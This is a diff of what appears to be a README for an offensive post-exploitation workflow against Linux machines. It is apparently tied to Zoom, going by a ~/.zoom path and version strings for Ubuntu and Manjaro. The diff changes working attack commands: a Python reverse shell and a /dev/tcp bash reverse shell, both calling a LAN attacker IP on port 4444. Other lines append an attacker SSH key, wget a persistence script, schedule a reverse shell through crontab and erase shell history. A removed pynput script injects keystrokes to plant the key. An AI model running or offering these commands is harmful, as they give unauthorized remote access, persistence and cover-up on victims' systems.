@@ -9,13 +9,13 @@
 
         python3 -m http.server
 
-3. Launch reverse shell (Victim)
+3. Launch reverse shell Or authorize our ssh key (Victim) 
 
-        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.89",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
     Or
 
-        echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsaYMfynllFnvDF7H37hVv6l3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys
+        echo "ssh-ed25519 AAAAC3NzaC1lZ--------SNIP-------3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys
 
 
 
@@ -24,7 +24,7 @@
 
 ### Load persistence script
 
-        wget http://192.168.5.11:8000/victim/per.sh
+        wget http://192.168.10.89:8000/victim/per.sh
 
         chmod +x ./per.sh
 
@@ -45,13 +45,13 @@ This will do the following:
 
 - Could also be used to start persistent logging capabilities.
 
-        (crontab -l ; echo "* 6 * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.11/4444 0>&1'")|crontab 2> /dev/null
+        (crontab -l ; echo "* * * * * ~/.zoom/logs/rev.sh ")|crontab 2> /dev/null
 
 
 
 4. Erase shell history 
 
-        echo "" > ~/.bash_history
+        history -c
 
 
 
@@ -82,21 +82,7 @@ This will do the following:
 
 
 
-keyboard = Controller()
-sleep(3)
-keyboard.press(Key.ctrl_l)
-keyboard.press(Key.alt_l)
-keyboard.press('t')
-keyboard.release(Key.ctrl_l)
-keyboard.release(Key.alt_l)
-keyboard.release('t')
-sleep(1)
-keyboard.type('echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsaYMfynllFnvDF7H37hVv6l3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys')
-sleep(2)
-keyboard.press(Key.enter)
-keyboard.release(Key.enter)
-sleep(1)
-keyboard.type('exit')
-sleep(1)
-keyboard.press(Key.enter)
-keyboard.release(Key.enter)
+
+
+Ubuntu 5.0.399860.0429
+Manjaro 5.0.398100.0427-1
